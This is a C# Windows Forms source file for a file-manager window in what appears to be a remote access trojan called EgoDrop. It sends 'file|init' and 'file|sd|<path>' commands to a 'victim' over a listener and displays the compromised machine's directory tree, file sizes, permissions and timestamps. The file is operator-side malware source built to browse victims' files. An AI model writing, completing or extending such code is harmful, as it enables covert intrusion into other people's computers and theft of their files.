using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmFileMgr : Form
    {
        private clsVictim m_victim { get; set; }
        private string m_szInitDir { get; set; }
        private struct stFileInfo
        {
            public bool bDirectory;
            public string szFilePath;
            public string szFileName { get { return szFilePath.Split('/').Last(); } }
            public ulong nFileSize;
            public string szPermission;

            public string szCreationDate;
            public string szLastModifiedDate;
            public string szLastAccessedDate;

            public stFileInfo(
                bool bDirectory,
                string szFilePath,
                ulong nFileSize,
                string szPermission,
                
                string szCreationDate,
                string szLastModifiedDate,
                string szLastAccessedDate
            )
            {
                this.bDirectory = bDirectory;
                this.szFilePath = szFilePath;
                this.nFileSize = nFileSize;
                this.szPermission = szPermission;

                this.szCreationDate = szCreationDate;
                this.szLastModifiedDate = szLastModifiedDate;
                this.szLastAccessedDate = szLastAccessedDate;
            }
        }

        public frmFileMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szInitDir = string.Empty;
        }

        private void fnRecvMsg(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                try
                {
                    if (lsMsg[0] == "file")
                    {
                        if (lsMsg[1] == "init")
                        {
                            textBox1.Text = lsMsg[2];
                            textBox1.Tag = lsMsg[2];
                            m_szInitDir = lsMsg[2];

                            TreeNode node = fnAddTreeNodeByPath(m_szInitDir);
                            treeView1.ExpandAll();
                            treeView1.SelectedNode = node;
                        }
                        else if (lsMsg[1] == "sd")
                        {
                            string szPath = lsMsg[2];
                            TreeNode tnNode = fnFindTreeNodeByPath(szPath, treeView1.Nodes);
                            if (tnNode == null)
                                return;

                            textBox1.Text = szPath;
                            textBox1.Tag = szPath;
                            listView1.Items.Clear();

                            List<List<string>> ls = clsEZData.fn2dLB64Decode(lsMsg[3]);
                            List<stFileInfo> lsFolder = new List<stFileInfo>();
                            List<stFileInfo> lsFile = new List<stFileInfo>();

                            foreach (var lFile in ls)
                            {
                                string szFilePath = lFile[1];
                                string szFileName = szFilePath.Split('/').Last();
                                if (string.IsNullOrEmpty(szFileName) || szFileName == "." || szFileName == "..")
                                    continue;

                                bool bDirectory = lFile[0] == "1";
                                ulong nFileSize = ulong.Parse(lFile[2]);
                                string szPermission = lFile[3];
                                string szCreationDate = lFile[4];
                                string szLastModifiedDate = lFile[5];
                                string szLastAccessedDate = lFile[6];

                                stFileInfo file = new stFileInfo(
                                    bDirectory,
                                    szFilePath,
                                    nFileSize,
                                    szPermission,
                                    szCreationDate,
                                    szLastModifiedDate,
                                    szLastModifiedDate
                                );

                                if (bDirectory)
                                    lsFolder.Add(file);
                                else
                                    lsFile.Add(file);
                            }

                            List<stFileInfo> lFinal = lsFolder.Concat(lsFile).ToList();
                            foreach (var entry in lFinal)
                            {
                                ListViewItem item = new ListViewItem(entry.szFileName);
                                item.SubItems.Add(entry.nFileSize.ToString());
                                item.SubItems.Add(entry.szPermission);
                                item.SubItems.Add(entry.szCreationDate);
                                item.SubItems.Add(entry.szLastModifiedDate);
                                item.SubItems.Add(entry.szLastAccessedDate);

                                item.ImageIndex = entry.bDirectory ? 1 : 0;
                                item.Tag = entry;

                                listView1.Items.Add(item);

                                if (entry.bDirectory)
                                {
                                    fnAddTreeNodeByPath(entry.szFilePath);
                                }
                            }

                            listView1.Refresh();
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "fileMgr", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }));
        }

        private TreeNode fnFindTreeNodeByPath(string szPath, TreeNodeCollection treeNodeCollection, TreeNode node = null)
        {
            if (string.IsNullOrEmpty(szPath) || treeNodeCollection.Count == 0)
                return node;

            if (node == null)
                node = treeNodeCollection[0];

            string szNewPath = szPath.Trim('/');
            string[] split = szNewPath.Split('/');
            foreach (TreeNode tnNode in node.Nodes)
            {
                if (string.Equals(tnNode.Text, split.First()))
                {
                    return fnFindTreeNodeByPath(string.Join("/", split.Skip(1).ToArray()), tnNode.Nodes, tnNode);
                }
            }

            return node;
        }

        private TreeNode fnAddTreeNodeByPath(string szPath)
        {
            TreeNode fnRecursive(TreeNode node, string szRelativePath)
            {
                if (string.IsNullOrEmpty(szRelativePath))
                    return node;
                else
                {
                    if (string.IsNullOrEmpty(szRelativePath))
                        return node;

                    szRelativePath = szRelativePath.Trim('/');

                    TreeNode tnNode = null;
                    string[] split = szRelativePath.Split('/');

                    foreach (TreeNode t in node.Nodes)
                    {
                        if (string.Equals(t.Text, split.First()))
                        {
                            tnNode = t;
                            break;
                        }
                    }

                    if (tnNode == null)
                    {
                        tnNode = new TreeNode(split.First());
                        node.Nodes.Add(tnNode);

                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                    else
                    {
                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                }
            }

            TreeNode tnRoot = null;
            if (treeView1.Nodes.Count == 0)
            {
                tnRoot = new TreeNode("/");
                treeView1.Nodes.Add(tnRoot);
            }
            else
            {
                tnRoot = treeView1.Nodes[0];
            }

            if (szPath == "/")
            {
                return tnRoot;
            }
            else
            {
                return fnRecursive(tnRoot, szPath);
            }
        }

        public void fnWriteFile(string szFilePath, string szContent)
        {

        }
        public void fnReadFile(string szFilePath, string szContent)
        {

        }

        private void fnSetup()
        {
            m_victim.fnSendCommand("file|init");
            m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmFileMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecvMsg;
        }

        private async void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
            m_victim.fnSendCommand("file|sd|" + szPath);
        }
    }
}
